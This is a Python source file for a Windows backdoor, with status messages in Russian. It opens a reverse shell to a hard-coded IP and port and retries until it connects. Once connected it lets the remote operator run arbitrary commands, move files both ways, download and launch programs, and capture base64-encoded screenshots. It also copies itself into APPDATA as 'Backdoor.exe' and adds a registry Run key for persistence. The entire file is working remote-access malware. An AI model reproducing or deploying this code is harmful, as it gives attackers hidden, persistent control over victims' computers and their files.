#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import winreg
import base64 
import requests
from mss import mss

def reliable_send(data,sock):
        json_data = json.dumps(data).encode()
        sock.send(json_data)

def reliable_recv(sock):
        json_data = b""
        while True:
                try:
                        json_data += sock.recv(1024)
                        return json.loads(json_data.decode())
                except ValueError:
                        continue

def download(url):
        try:
                get_response = requests.get(url, timeout=10)
                file_name = url.split("/")[-1]
                with open(file_name, "wb") as out_file:
                        out_file.write(get_response.content)
                return f"[+] Файл {file_name} успешно скачан!"
        except Exception as e:
                return f"[!!] Ошибка скачивания файла: {e}"
      
def screenshot():
        try:
                with mss() as sct:
                        screenshot_file = sct.shot(output="screenshot.png")
                with open(screenshot_file, "rb") as screen_file:
                        return base64.b64encode(screen_file.read())
        finally:
                if os.path.exists("screenshot.png"):            
                    os.remove("screenshot.png")
def upload(sock, file_name):
        try: 
            with open(file_name, "rb") as file:
                reliable_send(base64.b64encode(file.read()).decode(), sock)
            reliable_send("[+] Файл успешно отправлен", sock)
        except FileNotFoundError:
              reliable_send("[!!] Файл не найден", sock)

def save_file(sock, file_name):
        try:
            with open(file_name, "wb") as file:
                file_data = reliable_recv(sock)
                file.write(base64.b64decode(file_data))
            reliable_send("[+] Файл успешно загружен", sock)
        except Exception as e:
            reliable_send(f"[!!] Ошибка загрузки файла: {e}", sock)

def execute_command(sock, command):
    try:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = proc.stdout.read() + proc.stderr.read()
        reliable_send(result.decode(errors="ignore"), sock)
    except Exception as e:
        reliable_send(f"[!!] Ошибка выполнения команды: {e}", sock)
            

def shell(sock):
    while True:
        command = reliable_recv(sock)
        if command == "q":
              break
        elif command.startswith("cd"):
                try:
                    os.chdir(command[3:])
                    reliable_send(f"[+] Переход в директорию: {os.getcwd()}", sock)
                except Exception as e:
                      reliable_send(f"[!!] Ошибка: {e}", sock)
        elif command.startswith("download"):
            upload(sock, command[9:])
        elif command.startswith("upload"):
            save_file(sock, command[7:])
        elif command.startswith("get"):
            result = download(command[4:])
            reliable_send(result, sock)
        elif command.startswith("start"):
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send(f"[+] Файл {command[6:]} успешно запущен", sock)
            except Exception as e:
                reliable_send(f"[!!] Ошибка запуска файла: {e}", sock)
        elif command.startswith("screenshot"):
            screenshot_data = screenshot()
            reliable_send(screenshot_data.decode(), sock)
        else:
            execute_command(sock, command)

def connection():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("192.168.178.67", 54321))
            shell(sock)
            sock.close() 
        except socket.error:
            time.sleep(5)

#создание автозапуска в реестре
def setup_autorun():
        location = os.environ["APPDATA"] + "\\Backdoor.exe"
        if not os.path.exists(location):
                shutil.copyfile(sys.executable, location)
                try:
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE) as key:
                                winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
                except Exception as e:
                        pass


if __name__ == "__main__":
        setup_autorun()
        connection()

